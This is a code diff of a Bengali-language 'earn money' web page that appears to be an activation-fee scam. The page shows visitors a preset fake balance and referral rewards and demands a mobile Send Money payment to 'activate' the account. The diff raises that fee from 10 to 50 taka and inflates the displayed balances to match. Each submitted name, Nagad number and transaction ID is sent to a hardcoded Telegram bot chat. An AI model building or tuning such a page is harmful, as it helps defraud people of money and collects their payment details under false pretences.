@@ -44,7 +44,7 @@
                 </div>
                 <div>
                     <h4 class="font-bold text-amber-300 text-xs">অ্যাকাউন্টটি ইনঅ্যাক্টিভ রয়েছে!</h4>
-                    <p class="text-[11px] text-slate-300 mt-0.5">কাজ শুরু করতে ১০ দিয়ে একাউন্ট একটিভ করুন।</p>
+                    <p class="text-[11px] text-slate-300 mt-0.5">কাজ শুরু করতে ৫০ দিয়ে একাউন্ট একটিভ করুন।</p>
                 </div>
             </div>
             <button onclick="openActivationModal()" class="bg-gradient-to-r from-amber-500 to-orange-600 text-slate-950 font-extrabold px-3.5 py-2.5 rounded-2xl text-xs shadow-lg shadow-orange-500/20 flex items-center gap-1 hover:scale-105 transition shrink-0">
@@ -63,7 +63,7 @@
                 </div>
                 <div class="text-right bg-slate-800/80 backdrop-blur-md px-4 py-2.5 rounded-2xl border border-slate-700">
                     <p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">MAIN BALANCE</p>
-                    <h1 class="text-2xl font-black mt-0.5 text-emerald-400" id="mainBalanceDisplay">৳15.00</h1>
+                    <h1 class="text-2xl font-black mt-0.5 text-emerald-400" id="mainBalanceDisplay">৳50.00</h1>
                 </div>
             </div>
         </div>
@@ -76,7 +76,7 @@
                 </div>
                 <div>
                     <h4 class="font-extrabold text-xs text-emerald-300">রেফার করুন ও প্রিমিয়াম আয় করুন!</h4>
-                    <p class="text-[11px] text-slate-300">প্রতি সফল রেফারে ইনস্ট্যান্ট পান <b class="text-emerald-400">১৫ টাকা</b> 💸</p>
+                    <p class="text-[11px] text-slate-300">প্রতি সফল রেফারে ইনস্ট্যান্ট পান <b class="text-emerald-400">৫০ টাকা</b> 💸</p>
                 </div>
             </div>
             <div class="flex items-center bg-slate-900/90 rounded-2xl p-1.5 border border-slate-700">
@@ -213,7 +213,7 @@
 
     </div>
 
-    <!-- Custom Beautiful Popup Modal (Replaces Browser Alert) -->
+    <!-- Custom Beautiful Popup Modal -->
     <div id="customPopupModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
         <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 w-full max-w-xs shadow-2xl text-center space-y-4">
             <div class="w-12 h-12 bg-amber-500/20 text-amber-400 border border-amber-500/30 rounded-2xl flex items-center justify-center mx-auto text-xl">
@@ -239,7 +239,7 @@
                     <i class="fa-solid fa-bolt text-xl"></i>
                 </div>
                 <h3 class="text-lg font-bold text-white">একাউন্ট একটিভ করুন</h3>
-                <p class="text-xs text-rose-400 font-medium mt-1">⚠️ অবশ্যই ১০ টাকা Send Money করতে হবে!</p>
+                <p class="text-xs text-rose-400 font-medium mt-1">⚠️ অবশ্যই ৫০ টাকা Send Money করতে হবে!</p>
             </div>
             <div class="bg-slate-800/80 border border-slate-700 p-3.5 rounded-2xl mb-4 text-xs text-slate-300 space-y-1">
                 <p class="flex justify-between items-center">
@@ -284,7 +284,7 @@
             
             <div class="bg-gradient-to-r from-teal-900/40 to-emerald-900/40 border border-teal-500/30 p-4 rounded-2xl text-white text-center mb-4 shadow-inner">
                 <p class="text-[10px] uppercase font-bold tracking-wider text-teal-300">বর্তমান ব্যালেন্স</p>
-                <h2 class="text-2xl font-black mt-0.5 text-emerald-400" id="modalBalanceDisplay">৳15.00</h2>
+                <h2 class="text-2xl font-black mt-0.5 text-emerald-400" id="modalBalanceDisplay">৳50.00</h2>
             </div>
 
             <form onsubmit="handleWithdrawSubmit(event)" class="space-y-3">
@@ -377,7 +377,7 @@
         const CHAT_ID = '6733473116';
 
         let isAccountActive = localStorage.getItem('hi_account_active') === 'true';
-        let userBalance = parseFloat(localStorage.getItem('hi_user_balance')) || 15.00;
+        let userBalance = localStorage.getItem('hi_user_balance') !== null ? parseFloat(localStorage.getItem('hi_user_balance')) : 50.00;
 
         window.addEventListener('DOMContentLoaded', () => {
             const savedName = localStorage.getItem('hi_user_name');
@@ -443,7 +443,7 @@
             }
             const copyText = document.getElementById("referLinkInput");
             copyText.select();
-            copyText.setSelectionRange(0, 99999);
+            copyText.setSelectionRange(0, 9999);
             navigator.clipboard.writeText(copyText.value);
             showCustomPopup("আপনার রেফারেল লিঙ্ক কপি হয়েছে!");
         }
@@ -459,7 +459,7 @@
             submitBtn.innerText = 'জমা হচ্ছে...';
             submitBtn.disabled = true;
 
-            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
+            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট (৫০ টাকা)!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
 
             fetch(url)
